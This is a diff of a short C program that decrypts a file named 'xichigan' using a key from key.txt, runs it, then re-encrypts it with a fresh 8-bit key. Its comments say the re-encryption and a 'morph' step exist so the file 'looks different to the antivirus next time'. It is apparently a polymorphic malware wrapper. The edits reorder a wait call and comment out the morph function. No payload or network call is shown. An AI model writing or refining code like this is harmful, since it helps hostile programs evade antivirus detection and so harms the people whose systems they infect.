@@ -15,7 +15,7 @@ int main(int argc, char*argv[]) {
 	int status;
  	
 	/* 
-		Decrypt the file MtoX.c using the key in key.txt
+		Decrypt the file Xichigan using the key in key.txt
 	*/
 	// Get the key from key.txt
 	keyFp = fopen("key.txt","r");
@@ -29,9 +29,9 @@ int main(int argc, char*argv[]) {
 		Once the file is decrypted, start xichigan running
 	*/
 	system ("xichigan");
-	wait(&status);
 
 	// Wait for xichigan to finish
+	wait(&status);
 
 	/* 
 		Get a key to encrypt the file with (8 bit key) = 1-255 DEC 
@@ -48,11 +48,11 @@ int main(int argc, char*argv[]) {
 		Encrypt/Morph the file xichigan using the key so it looks different to the antivirus next time
 	*/
 
+	// Morph the file xichigan
+	//morphFile();
+
 	// Encrypt the file xichigan
 	decryptFile(key); // Symmetric key; so 'decrypt' is encrypt as well
-
-	// Morph the file xichigan
-	morphFile();
 
 	return 0;
 }
